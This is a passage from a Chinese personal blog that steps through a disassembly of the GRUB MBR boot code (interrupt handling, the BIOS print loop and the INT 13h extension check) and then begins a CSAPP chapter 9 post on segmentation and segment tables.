<span class="math display">\[
Addr=CS\times 16+IP
\]</span>
实际上就是CS的二进制表示左移4位,十六进制表示左移一位,然后加上IP</p>
<p>如果CS保持不变则为段内跳转,如果CS改变就是跨段跳转了</p>
<p>段内跳转:<code>jmp short artx</code></p>
<p>artx就是要跳转到的<strong>绝对地址</strong></p>
<p>artx是计算得到的,怎么算的呢?</p>
<p>在执行本条指令的时候,IP已经指向下一条指令的地址,</p>
<p>在实际的机器码指令中保存的是相对偏移量DISP,用这个相对偏移量加上更新了的IP得到的就是要跳转到的绝对地址</p>
<p>short表示为一个8位带符号数(范围<span
class="math inline">\([-128,127]\)</span>),意思是限制相对偏移量DISP的范围</p>
</blockquote>
<p>在执行本条指令<code>00000000  EB63        jmp short 0x65</code>时,<code>IP=0x2</code>,</p>
<p>机器码<code>EB63</code>告诉我们相对偏移量<code>DISP=0x63</code>,</p>
<p><code>IP=IP+DISP=0x2+0x63=0x65</code></p>
<blockquote>
<p>至于为什么上来就要跳转到中间,越过好多字节,这个问题在<code>00000096  BE057C       mov si,0x7c05</code>我们会恍然大悟,现在看来是越过了好多"指令"没有执行,实际上不是"指令",是反汇编器将数据也反汇编成指令了</p>
</blockquote>
<p>由于该跳转无条件执行,我们跟随该跳转,看看发生了什么</p>
<h4 id="fa-cli"><code>00000065  FA         cli</code></h4>
<blockquote>
<p>关于处理器控制指令</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614112455326.png"
alt="image-20220614112455326" />
<figcaption aria-hidden="true">image-20220614112455326</figcaption>
</figure>
</blockquote>
<p>CLI之后,IF置0,CPU不允许中断</p>
<blockquote>
<p>信号量的机制应该也是这样</p>
</blockquote>
<p>此处的CLI指令和后面<code>0000007D  FB         sti</code>相互匹配</p>
<p>进行了一个CPU的中断关开</p>
<h4 id="nop"><code>00000066  90         nop</code></h4>
<p>空操作指令 NOP 执行该指令并不产生任何结果，<strong>仅仅消耗 3
个时钟周期的时间</strong>，常用于程序的延时等。</p>
<h4 id="nop-1"><code>00000067  90         nop</code></h4>
<p>同样啥也不干,耗时</p>
<h4
id="f6c280-test-dl0x80"><code>00000068  F6C280       test dl,0x80</code></h4>
<p>测试一下<code>dl</code>是否为<code>0x80</code></p>
<p>如果<code>dl==0x80</code>则<code>ZF=1</code>否则<code>ZF=0</code>,设置标志位之后方便后续的条件转移等</p>
<blockquote>
<p>回顾一下grub干了啥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 将程序代码由<span class="number">0</span>:<span class="number">7</span>C00H移动到<span class="number">0</span>:<span class="number">0600</span>H（注，BIOS把MBR放在<span class="number">0</span>:<span class="number">7</span>C00H处）</span><br><span class="line"><span class="number">2</span> 搜索可引导分区，即<span class="number">80</span>H标志</span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">失败：跳入ROM BASIC</span><br><span class="line">无效分区表：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span> 读引导扇区</span><br><span class="line">失败：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">4</span></span><br><span class="line"><span class="number">4</span> 验证引导扇区最后是否为<span class="number">55</span>AAH</span><br><span class="line">失败：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">6</span></span><br><span class="line"><span class="number">5</span> 打印错误进入无穷循环</span><br><span class="line"><span class="number">6</span> 跳到<span class="number">0</span>:<span class="number">7</span>C00H进行下一步启动工作</span><br></pre></td></tr></table></figure>
<p>80H是可引导分区的标志</p>
</blockquote>
<p>硬盘的驱动器号从0x80开始编号,这里测试dl是不是80开头的,目的是判断是否是硬盘驱动</p>
<p>奇怪的是,在此之前的指令中并没有设置dl值的指令,因此dl此时为0,本次测试必然不通过</p>
<h4
id="b-7502-jnz-0x6f"><code>0000006B  7502        jnz 0x6f</code></h4>
<blockquote>
<p>关于条件跳转指令</p>
<p>条件转移指令的目的地址必须在现行的代码段（CS）内，并且以
当前指令指针寄存器 IP 内容为基准，转移范围内在＋127～－128
的范围之内。</p>
</blockquote>
<p>如果刚才判断的dl是<code>0x80</code>则跳转<code>0x6f</code>,</p>
<p>我们按照某些工作都没做,dl还没有被置为0x80,暂且不跟随跳转,顺序执行</p>
<h4
id="d-b280-mov-dl0x80"><code>0000006D  B280              mov dl,0x80</code></h4>
<p>说曹操,曹操到,现在将dl置为0x80标志某些工作已经进行了</p>
<h4
id="f-ea747c0000-jmp-0x00x7c74"><code>0000006F  EA747C0000     jmp 0x0:0x7c74</code></h4>
<p>绝对跳转,跳转到<code>0x7c74</code>,也就是<code>0x74</code>位置,笑死,就在下一行</p>
<h4 id="c0-xor-axax"><code>00000074  31C0        xor ax,ax</code></h4>
<p>ax寄存器置零,没有用<code>mov ax,0</code>是因为mov指令编码长,用xor指令优化</p>
<h4 id="ed8-mov-dsax"><code>00000076  8ED8        mov ds,ax</code></h4>
<p><code>0-&gt;ax-&gt;ds</code></p>
<p>ds段寄存器置0,</p>
<h4 id="ed0-mov-ssax"><code>00000078  8ED0        mov ss,ax</code></h4>
<p>ss寄存器置0</p>
<blockquote>
<p>ss为stack
segment,堆栈段寄存器,栈顶指针的段地址在ss寄存器中,段内偏移量在sp中,ss:sp指向栈顶</p>
</blockquote>
<h4
id="a-bc0020-mov-sp0x2000"><code>0000007A  BC0020       mov sp,0x2000</code></h4>
<p>本步和上一步正式建立了栈空间</p>
<h4 id="d-fb-sti"><code>0000007D  FB         sti</code></h4>
<blockquote>
<p>关于处理器控制指令</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614111629831.png"
alt="image-20220614111629831" />
<figcaption aria-hidden="true">image-20220614111629831</figcaption>
</figure>
</blockquote>
<p>标志位指令,STI是开中断标志,该指令执行之后IF=1,意思是允许CPU发生中断了,</p>
<p>本指令和<code>00000065  FA         cli</code>之间的指令会被CPU一直执行不被中断,这保证了各种寄存器和堆栈等一直有效</p>
<h4
id="e-a0647c-mov-al0x7c64"><code>0000007E  A0647C       mov al,[0x7c64]</code></h4>
<p>一个直接寻址,将内存上<code>0x7c64</code>这个单元中的东西放在<code>al</code>寄存器中</p>
<p><code>0x7c64</code>所指位置代表启动盘,内核存放其中</p>
<p>这个单元放了啥呢? <code>00000064  FF         db 0xff</code></p>
<p><code>0xff</code>表示使用启动盘</p>
<h4
id="cff-cmp-al0xff"><code>00000081  3CFF        cmp al,0xff</code></h4>
<p>蜜汁操作,刚刚把<code>M[0x7c64]=0xff</code>放进al,就要检查al是不是<code>0xff</code></p>
<p>猜测是后来<code>M[0x7c64]</code>会有改变,现在是第一次执行,尚且没变</p>
<p>这应该是一个指针</p>
<h4 id="jz-0x87"><code>00000083  7402        jz 0x87</code></h4>
<p>如果刚才的检查通过,则跳转<code>0x87</code></p>
<p>由于<code>0x87</code>和<code>0x83</code>之间(即刚才的检查没通过时),只有一条指令,我们不跟随跳转</p>
<blockquote>
<p>这里检查我们是否有强制磁盘引用</p>
</blockquote>
<h4 id="c2-mov-dlal"><code>00000085  88C2        mov dl,al</code></h4>
<p><code>0x81</code>处的检查没有通过,即<code>al</code>中不是<code>0xff</code>,是多少现在不知道,先放在<code>dl</code>中</p>
<p>在此之前涉及到<code>dl</code>寄存器的有一个<code>0000006D  B280              mov dl,0x80</code></p>
<p>dl置0x80是可引导分区的标志,现在把他改了,推测为后面引导失败埋下伏笔</p>
<p>首次执行,本条指令不会被执行</p>
<h4 id="push-dx"><code>00000087  52         push dx</code></h4>
<p>dx寄存器中的东西压栈</p>
<p>dx中是啥呢?dh高位啃腚为0,低位有两种情况</p>
<p>如果<code>00000081  3CFF        cmp al,0xff</code>处的判断通过,则<code>dl=0x80</code></p>
<p>否则就不是第一次执行到这里了,<code>M[0x7c64]</code>已经发生过改变</p>
<p>我们按照第一次执行的逻辑,dx就是0xff</p>
<blockquote>
<p>此时栈中状态</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614160219999.png"
alt="image-20220614160219999" />
<figcaption aria-hidden="true">image-20220614160219999</figcaption>
</figure>
</blockquote>
<h4
id="bb1704-mov-bx0x417"><code>00000088  BB1704       mov bx,0x417</code></h4>
<p><code>0x417-&gt;bx</code></p>
<h4
id="b-802703-and-byte-bx0x3"><code>0000008B  802703       and byte [bx],0x3</code></h4>
<blockquote>
<p>关于属性运算符</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614114636880.png"
alt="image-20220614114636880" />
<figcaption aria-hidden="true">image-20220614114636880</figcaption>
</figure>
</blockquote>
<p>bx在上一条指令中已经置为<code>0x417</code>了</p>
<p>本条指令的意思是,首先进行一个寄存器间接寻址,取<code>M[R[bx]]=M[0x417]</code></p>
<p>取出该内存单元的最低字节的内容,看看最低位是不是两个1,如果是则置标志位<code>ZF=1</code></p>
<h4 id="e-7406-jz-0x96"><code>0000008E  7406        jz 0x96</code></h4>
<p>如果刚才的判断通过,则跳转<code>0x96</code></p>
<p>跳转越过了<code>0x90,0x93</code>两条指令,这是一个函数调用</p>
<h4
id="be887d-mov-si0x7d88"><code>00000090  BE887D       mov si,0x7d88</code></h4>
<p>把<code>0x7d88</code>放在si寄存器,作为串操作的源头</p>
<p>而<code>0x7d88</code>上放的是啥呢?</p>
<p><code>0x7d88</code>相对于本文件基地址的偏移量为<code>0x7d88-0x7c00=0x188</code></p>
<p>去这个地方看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br></pre></td></tr></table></figure>
<p>都是指令?这就奇怪了,串操作的源头是一些指令,而不是一个连续的数组.</p>
<p>目前我们只是看出了串操作的一点雏形,将"源"放在si寄存器中,但是用串操作干了什么,尚不可知,</p>
<p>我们暂且保持懵逼的状态,继续向后看,我保证后面有一刻,会恍然大悟</p>
<h4
id="e81c01-call-0x1b2"><code>00000093  E81C01       call 0x1b2</code></h4>
<p>调用位于<code>0x1b2</code>的函数</p>
<p>我们跟随该函数</p>
<h4 id="进入循环">进入循环</h4>
<blockquote>
<p>该调用指令,实际上进入了一个循环,但是现在看不出来</p>
</blockquote>
<h4 id="b2-ac-lodsb"><code>000001B2  AC         lodsb</code></h4>
<blockquote>
<p>关于串装入指令</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614151353806.png"
alt="image-20220614151353806" />
<figcaption aria-hidden="true">image-20220614151353806</figcaption>
</figure>
<p>说了个什么事情呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, ［esi］    ;将字节送入AL</span><br><span class="line">inc esi    ;指向下一个字节</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在调用函数之前,<code>si&lt;-0x7d88</code></p>
<p><code>mov al, ［esi］</code>执行之后,<code>M[0x7d88]=M[0x188]-&gt;al</code></p>
<p><code>inc esi    ;</code>执行之后,<code>0x7d89-&gt;si</code></p>
<h4
id="b3-3c00-cmp-al0x0"><code>000001B3  3C00        cmp al,0x0</code></h4>
<p>比较al是不是0</p>
<h4
id="b5-75f4-jnz-0x1ab"><code>000001B5  75F4        jnz 0x1ab</code></h4>
<p>如果al不是0则跳转<code>0x1ab</code></p>
<h4
id="ab-bb0100-mov-bx0x1"><code>000001AB  BB0100       mov bx,0x1</code></h4>
<p><code>1-&gt;bx</code>,给后面的int指令设置参数</p>
<h4
id="ae-b40e-mov-ah0xe"><code>000001AE  B40E        mov ah,0xe</code></h4>
<p><code>0xe-&gt;ah</code>,给后面的int指令设置参数</p>
<h4
id="b0-cd10-int-0x10"><code>000001B0  CD10        int 0x10</code></h4>
<blockquote>
<p>此处的中断参考<a
target="_blank" rel="noopener" href="https://zoxoy.club/post/Print-char-by-INT-0x10/">使用汇编语言触发BIOS中断INT
0x10进行屏幕输出 (zoxoy.club)</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614152209611.png"
alt="image-20220614152209611" />
<figcaption aria-hidden="true">image-20220614152209611</figcaption>
</figure>
</blockquote>
<p>在<code>0x1AE</code>中ah已经被置为<code>0xe</code>,那么此中断就触发了屏幕输出,输出的是啥呢?</p>
<p>要显示的字符在AL上</p>
<p>可以看出来,从<code>0x1AB</code>到<code>0x1B5</code>是一个循环,循环打印字符到屏幕,循环停止的条件是碰见<code>\0</code>结束标志</p>
<p>字符来源是<code>0x1B2</code>的<code>lodsb</code>,是从<code>0x93</code>处的调用指令<code>00000093  E81C01       call 0x1b2</code>转移过来的</p>
<p><code>lodsb</code>操作串的来源是<code>00000090  BE887D       mov si,0x7d88</code>,即内存中<code>0x7d88</code>这个位置</p>
<p>现在我们必须要考虑清楚串操作的源头为啥是一伙子指令了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br><span class="line">0000018C  2000              and [bx+si],al</span><br></pre></td></tr></table></figure>
<p>观察机器码,<code>0x47,0x52,0x55,0x42,0x00,0x20</code>(最后小端模式拆开)</p>
<p>好像前面几个都是ASCII可打印字符,尝试打印一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614153820258.png"
alt="image-20220614153820258" />
<figcaption aria-hidden="true">image-20220614153820258</figcaption>
</figure>
<p>竟然打印出了"GRUB"字样,这绝对不是巧合,就应该是这个字符串</p>
<p><strong>原来是nasm软件无法区分指令和数据,将数据也反汇编成指令了</strong></p>
<p>那么<code>0x188到0x18c</code>对应<code>G,R,U,B,\0</code></p>
<p><code>0x18d</code>上放了一个20不应该和<code>0x18c</code>合起来分析</p>
<p>这意味着后面的反汇编很可能都是错误的,暂且不管后面的错误,我们刚才调用函数打印grub字符串的逻辑是没有错误的</p>
<p>在一开始我们使用010editor观察时,</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614160458438.png"
alt="image-20220614160458438" />
<figcaption aria-hidden="true">image-20220614160458438</figcaption>
</figure>
<p>后面还有好多具有实际意义的字符串</p>
<p>Error的ASCII编码为<code>0x45 72 72 6f 72</code></p>
<p>确实后面的"指令"中,有这个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">000001A3  45                inc bp</span><br><span class="line">000001A4  7272              jc 0x218</span><br><span class="line">000001A6  6F                outsw</span><br><span class="line">000001A7  720D              jc 0x1b6</span><br></pre></td></tr></table></figure>
<p>由此可见这一大块都是字符串</p>
<h4 id="退出循环">退出循环</h4>
<p>实际上"循环"就是指循环打印<code>0x188</code>上存好的<code>grub</code>字符串</p>
<p>跳出循环的条件是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000001B2  AC                lodsb</span><br><span class="line">000001B3  3C00              cmp al,0x0</span><br><span class="line">000001B5  75F4              jnz 0x1ab</span><br></pre></td></tr></table></figure>
<p>这里al为0,即指向<code>grub\0</code>最后这个<code>\0</code></p>
<p>跳出循环即执行<code>000001B7  C3         ret</code></p>
<h4 id="b7-c3-ret"><code>000001B7  C3         ret</code></h4>
<p>函数调用返回,返回到<code>00000093  E81C01       call 0x1b2</code>的下一句<code>00000096  BE057C       mov si,0x7c05</code></p>
<h4
id="be057c-mov-si0x7c05"><code>00000096  BE057C       mov si,0x7c05</code></h4>
<p><code>0x7c05</code>作为串的源头,<code>0x7c05</code>上是什么呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000003  108ED0BC          adc [bp-0x4330],cl</span><br><span class="line">00000007  00B0B800          add [bx+si+0xb8],dh</span><br></pre></td></tr></table></figure>
<p><code>M[0x3]=BC</code></p>
<p><code>M[0x4]=D0</code></p>
<p><code>M[0x5]=8E</code></p>
<p><code>M[0x6]=10</code></p>
<p><code>M[0x7]=00</code></p>
<h4
id="f6c280-test-dl0x80-1"><code>00000099  F6C280       test dl,0x80</code></h4>
<p>检查dl上是否还是0x80</p>
<h4 id="c-7448-jz-0xe6"><code>0000009C  7448        jz 0xe6</code></h4>
<p>如果dl上是0x80则跳转0xe6,如果不是则继续执行</p>
<p>不跟随跳转,继续执行</p>
<h4
id="e-b441-mov-ah0x41"><code>0000009E  B441        mov ah,0x41</code></h4>
<p>ah高位置0x41,是为了给<code>int 0x13</code>指令设置参数</p>
<h4
id="a0-bbaa55-mov-bx0x55aa"><code>000000A0  BBAA55       mov bx,0x55aa</code></h4>
<p><code>0x55aa-&gt;bx</code>,<code>0x55aa</code>是主引导记录的魔数,这里应该是要进行某些判断了</p>
<h4
id="a3-cd13-int-0x13"><code>000000A3  CD13        int 0x13</code></h4>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614161620001.png"
alt="image-20220614161620001" />
<figcaption aria-hidden="true">image-20220614161620001</figcaption>
</figure>
</blockquote>
<h4 id="a5-5a-pop-dx"><code>000000A5  5A         pop dx</code></h4>
<p>恢复<code>dx=0x80</code></p>
<h4 id="a6-52-push-dx"><code>000000A6  52         push dx</code></h4>
<p><code>0x80</code>压栈</p>
<p>这两步显得很迷,退出来又放进去</p>
<blockquote>
<p>%dl 可能已被 INT 13 破坏，AH=41H。 例如，在 AST BIOS 1.04
中会发生这种情况。所以通过重复出入栈来纠正。</p>
</blockquote>
<h4 id="a7-723d-jc-0xe6"><code>000000A7  723D        jc 0xe6</code></h4>
<p>如果标志位CF=1则跳转</p>
<p>哪里置的标志位呢?</p>
<blockquote>
<p>jc指令与上面的int 13H ah=41H中断例程形成配合。后者的作用是判断 BIOS
是否支持扩展int13中断，如果支持，则CF=0，否则CF=1，那么jc指令就可以根据
BIOS 是否支持扩展int13中断来执行不同位置的“子程序指令”。</p>
<p>一般现在新的支持LBA模式的主板和Win98自带的DOS7操作系统是支持扩展INT
13的。</p>
</blockquote>
<h4
id="a9-81fb55aa-cmp-bx0xaa55"><code>000000A9  81FB55AA      cmp bx,0xaa55</code></h4>
<p>显然之前bx置过0xaa55,此处零标志置1</p>
<h4
id="ad-7537-jnz-0xe6"><code>000000AD  7537        jnz 0xe6</code></h4>
<blockquote>
<p>此时标志位ZF不等于0，所以jnz 0xd8不进行跳转。</p>
<p>谨慎起见，这条指令和上一条指令配合使用，继jc 0xd8之后，再次对int 13H
ah=41H中断指令的结果进行确认。确认BIOS支持扩展int13。</p>
<p>0xd8 处的指令是 CHS 寻址模式的，即是说如果不支持 LBA 寻址模式，则使用
CHS。</p>
</blockquote>
<h4
id="af-83e101-and-cxbyte-0x1"><code>000000AF  83E101       and cx,byte +0x1</code></h4>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162458403.png"
alt="image-20220614162458403" />
<figcaption aria-hidden="true">image-20220614162458403</figcaption>
</figure>
</blockquote>
<h4 id="b2-7432-jz-0xe6"><code>000000B2  7432        jz 0xe6</code></h4>
<p>不跳转</p>
<h4
id="b4-31c0-xor-axax"><code>000000B4  31C0        xor ax,ax</code></h4>
<p>ax寄存器置0</p>
<h4
id="b6-894404-mov-si0x4ax"><code>000000B6  894404       mov [si+0x4],ax</code></h4>
<p>此前si寄存器被置为0x7c05,现在将0放到0x7c09,0x7c0A上</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162653873.png"
alt="image-20220614162653873" />
<figcaption aria-hidden="true">image-20220614162653873</figcaption>
</figure>
</blockquote>
<h4 id="b9-40-inc-ax"><code>000000B9  40         inc ax</code></h4>
<p>ax=0x1</p>
<h4
id="ba-8844ff-mov-si-0x1al"><code>000000BA  8844FF       mov [si-0x1],al</code></h4>
<p>si-0x1指向0x7c04,将al的第字节0x1放进去</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162805804.png"
alt="image-20220614162805804" />
<figcaption aria-hidden="true">image-20220614162805804</figcaption>
</figure>
</blockquote>
<h4
id="bd-894402-mov-si0x2ax"><code>000000BD  894402       mov [si+0x2],ax</code></h4>
<p>1放到0x7c07</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162856400.png"
alt="image-20220614162856400" />
<figcaption aria-hidden="true">image-20220614162856400</figcaption>
</figure>
</blockquote>
<h4
id="c0-c7041000-mov-word-si0x10"><code>000000C0  C7041000      mov word [si],0x10</code></h4>
<p>0x10看成一个双字(高八位全0)放到0x7c05,0x7c06</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614162933671.png"
alt="image-20220614162933671" />
<figcaption aria-hidden="true">image-20220614162933671</figcaption>
</figure>
<p>0x7c06应该为0</p>
<blockquote>
<p>为啥这里要用一个"WORD",前面都没用?</p>
<p>因为这里直接把一个立即数放到内存上,没有经过寄存器,将寄存器搬到内存时,寄存器规格决定占用内存上几个单元</p>
<p>现在立即数0x10可以作为一个字节,可以作为一个字,一个双字等等,要用word规定一下0x10作为什么传送</p>
</blockquote>
<p>我太难了,
这暗无天日的反汇编分析什么时候是个头啊,不分析了放一个大佬的博客吧</p>
<p><a
target="_blank" rel="noopener" href="https://blog.csdn.net/lijiewen2017/article/details/124574991">MBR引导程序源码理解_背风衣人的博客-CSDN博客_mbr启动代码</a></p>
<h2 id="kernel">Kernel</h2>
<p>不管Grub干了啥,总之,它最后加载了Kernel并把控制交给了Kernel</p>
<p>从哪里加载的kernel呢?在硬盘中,文件系统的<code>/boot/</code>下面,vmlinuz文件,比如</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614165129321.png"
alt="image-20220614165129321" />
<figcaption aria-hidden="true">image-20220614165129321</figcaption>
</figure>
<p>问题是,现在的SATA硬盘驱动都是以模块方式添加的设备,在操作系统启起来之前,必然不可能载入模块</p>
<p>这个问题是用Initial RamDisk技术解决的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614235435725.png"
alt="image-20220614235435725" />
<figcaption aria-hidden="true">image-20220614235435725</figcaption>
</figure>
<p>台湾人把它翻译成"虚拟文件系统",实际上和VFS不是一个东西</p>
<p>到此,操作系统就起来了,后面操作系统(kernel)会检查各种硬件,然后启动各种服务</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/12/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/12/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/" class="post-title-link" itemprop="url">CSAPP-chapter9 内存管理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-06-12 11:18:00" itemprop="dateCreated datePublished" datetime="2022-06-12T11:18:00+08:00">2022-06-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-09-25 19:38:13" itemprop="dateModified" datetime="2023-09-25T19:38:13+08:00">2023-09-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="内存管理">内存管理</h1>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612081358649.png"
alt="image-20220612081358649" />
<figcaption aria-hidden="true">image-20220612081358649</figcaption>
</figure>
<h2 id="纯分段">纯分段</h2>
<p>最初分段的目的是实现各段可以随意增长</p>
<blockquote>
<p>啥意思呢?在既没有分段也没有分页的年代,程序装载进入内存是紧挨着放的,一条指令或数据紧挨着一条指令或数据.这就导致一个啥后果呢?</p>
<p>我想使用malloc获取一些堆空间,但是堆已经被左右两个块夹住了,大小固定了,找不到想要的空闲空间</p>
<p>分段之后,各段在内存中任意位置存放,一个程序在内存中可能被分割成几块,不必连续存放,两个程序可能交叉着在内存中存放</p>
<p>如果堆就放在一个堆段,堆顶指针指向该段的一头,如果该方向上紧挨着没有其他段,那么堆就可以变大了</p>
</blockquote>
<p>分段还实现了,代码和数据的分离,代码放在一个段,数据放在一个段</p>
<blockquote>
<p>可以简单意淫一下分段是啥样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">segment Code:</span><br><span class="line">	<span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,Data:buffer);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">segment Data:</span><br><span class="line">	<span class="type">char</span> buffer[]=<span class="string">&quot;helloworld&quot;</span></span><br></pre></td></tr></table></figure>
<p>只是意淫,因为x86-64上已经废除分段了,我也不知道真的分段程序怎么写</p>
<p>但是计组书上讲的老古董8086上的汇编语言是有明确的分段的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612074034741.png"
alt="image-20220612074034741" />
<figcaption aria-hidden="true">image-20220612074034741</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220612074118371.png"
alt="image-20220612074118371" />
<figcaption aria-hidden="true">image-20220612074118371</figcaption>
</figure>
</blockquote>
<p>分段使得段权限管理很方便</p>
<p>段的功能是由程序员指定的,程序员可以把只读代码都放一个Code段,可读写数据都放在Data段,只读数据都放在Rodata段等等,每个段都指定一下访问权限rwx就可以限定怎么访问它了,违反了指定好的权限的访问,操作系统会报告段错误</p>
<p>纯分段中是没有甚么"虚拟内存"概念的,因为虚拟内存的实现要分页,那么内存条子多大,地址空间就有多大,即物理内存</p>
<p>画个图意思意思纯分段系统上程序在内存中的存储状态:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611090810424.png"
alt="image-20220611090810424" />
<figcaption aria-hidden="true">image-20220611090810424</figcaption>
</figure>
<h3 id="段表">段表</h3>
<p>作战时一个师下辖三个团,那么师部就得维护这三个团的信息,包括:</p>
<p>1.团部人员信息,这方便师部联系团指挥员,这可能在师部里有一个电话本本</p>
<p>2.该团当前所在位置,这方便师部部署战术任务<del>(注意战术动作)</del>,这可能在师部里有一个沙盘</p>
<p>3.该团当前人员数量,这方便师部进行伤亡统计和兵员补给,这可能师部里有一个专门记录的本本</p>
<p>同样,一个进程被分成若干段,每个段都是大小可变的,每个段可以被安排在内存的任意地址,每个段是甚么访问属性,这也需要一个数据结构维护</p>
<p>每个段占用一个表项,现在我们可以想到,该表项至少应该有的内容</p>
<p>1.段地址,进程访问该段必须</p>
<p>2.段大小,检查访问越界错误必须</p>
<p>3.段访问权限,段保护必须</p>
<p>想不出还需要维护段的啥信息了,是时候看看权威怎么想这个事情的了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220611091807512.png"
alt="image-20220611091807512" />
<figcaption aria-hidden="true">image-20220611091807512</figcaption>
</figure>
<p>他的段表包括了三个项目:段号,段长,基址</p>
<p>段号是啥呢?程序员编程的时候会指定段名,比如Code,Data等,但是计算机并不喜欢这么长的信息,一个英文字母用ASCII编码都需要一个字节,那么一个"Code"就得编4字节,32位</p>
<p>如果程序员的程序就分了两个段,Data和Code,那么只用一个符号位就可以表示两种状态,分三段则需要2位</p>
<p>编译器会无视所有段名,将所有段从上到下顺次编号,这应该可以说是离散化的思想<a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1496">P1496 火烧赤壁 - 洛谷 |
计算机科学教育新生态 (luogu.com.cn)</a></p>
<p>把名字都映射成顺次增加的整数还有一个好处就是,段号还需要存储在段表中吗?</p>
<p>段表第一项存第一段,段表第二项存第二段...</p>
<p>段表也只需要把编译器翻译成的0,1,2,...n号段按顺序存起来</p>
